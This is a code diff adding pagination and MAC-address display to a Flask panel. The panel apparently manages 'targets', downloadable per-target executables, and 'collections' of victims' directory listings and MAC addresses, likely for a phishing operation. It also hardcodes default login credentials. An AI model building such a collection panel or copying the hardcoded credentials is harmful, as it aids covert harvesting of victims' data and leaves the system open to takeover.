@@ -12,6 +12,7 @@ from .models import (
     get_target_by_id, get_target_by_token, add_collection,
     get_collections_by_target, get_all_collections, get_stats,
     delete_collection, delete_collections_batch,
+    count_targets, get_targets_page, count_collections, get_collections_page,
 )
 
 UPLOADS_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'uploads')
@@ -33,6 +34,59 @@ routes_web = Blueprint('routes_web', __name__)
 # Default credentials
 DEFAULT_USERNAME = 'fish'
 DEFAULT_PASSWORD = 'fishfish@123'
+
+# Server-side pagination page sizes
+PAGE_SIZES = [20, 50, 100, 500, 1000, 99999]
+
+
+def _pagination_args():
+    try:
+        page = int(request.args.get('page', 1))
+    except (TypeError, ValueError):
+        page = 1
+    try:
+        page_size = int(request.args.get('page_size', 20))
+    except (TypeError, ValueError):
+        page_size = 20
+    if page_size not in PAGE_SIZES:
+        page_size = 20
+    return max(1, page), page_size
+
+
+def _page_items(current, total_pages):
+    if total_pages <= 7:
+        return list(range(1, total_pages + 1))
+    items = [1]
+    start = max(2, current - 2)
+    end = min(total_pages - 1, current + 2)
+    if start > 2:
+        items.append(None)
+    items.extend(range(start, end + 1))
+    if end < total_pages - 1:
+        items.append(None)
+    items.append(total_pages)
+    return items
+
+
+def _build_pagination(total, page, page_size):
+    if page_size >= 99999:
+        total_pages = 1
+    else:
+        total_pages = max(1, (total + page_size - 1) // page_size)
+    page = min(max(1, page), total_pages)
+    start = 0 if total == 0 else (page - 1) * page_size + 1
+    end = min(total, page * page_size)
+    return {
+        'total': total,
+        'page': page,
+        'page_size': page_size,
+        'total_pages': total_pages,
+        'start': start,
+        'end': end,
+        'has_prev': page > 1,
+        'has_next': page < total_pages,
+        'page_items': _page_items(page, total_pages),
+    }
 
 
 def login_required(f):
@@ -90,11 +144,19 @@ def _exe_exists(target_name, token):
 @routes_web.route('/targets')
 @login_required
 def targets():
-    all_targets = get_all_targets()
+    page, page_size = _pagination_args()
+    pagination = _build_pagination(count_targets(), page, page_size)
+    all_targets = get_targets_page(pagination['page'], pagination['page_size'])
     for t in all_targets:
         t['exe_exists'] = _exe_exists(t['name'], t['unique_token'])
     server_configured = _check_server_configured()
-    return render_template('targets.html', targets=all_targets, server_configured=server_configured)
+    return render_template(
+        'targets.html',
+        targets=all_targets,
+        server_configured=server_configured,
+        pagination=pagination,
+        page_sizes=PAGE_SIZES,
+    )
 
 
 @routes_web.route('/targets/add', methods=['GET', 'POST'])
@@ -272,6 +334,18 @@ def target_detail(target_id):
             c['dir_info_parsed'] = json.loads(c['directory_info'])
         except Exception:
             c['dir_info_parsed'] = None
+        try:
+            mac_data = json.loads(c['mac_address']) if c.get('mac_address') else []
+            if isinstance(mac_data, dict):
+                mac_data = [mac_data]
+            mac_values = []
+            for item in mac_data:
+                mac = (item.get('mac') or '').strip() if isinstance(item, dict) else ''
+                if mac and mac not in mac_values:
+                    mac_values.append(mac)
+            c['mac_list'] = ', '.join(mac_values)
+        except Exception:
+            c['mac_list'] = c.get('mac_address', '')
     return render_template('target_detail.html', target=target, collections=collections)
 
 
@@ -559,8 +633,15 @@ def download_exe(filename):
 @routes_web.route('/collections')
 @login_required
 def collections():
-    all_collections = get_all_collections()
-    return render_template('collections.html', collections=all_collections)
+    page, page_size = _pagination_args()
+    pagination = _build_pagination(count_collections(), page, page_size)
+    all_collections = get_collections_page(pagination['page'], pagination['page_size'])
+    return render_template(
+        'collections.html',
+        collections=all_collections,
+        pagination=pagination,
+        page_sizes=PAGE_SIZES,
+    )
 
 
 @routes_web.route('/collections/<int:col_id>/delete', methods=['POST'])
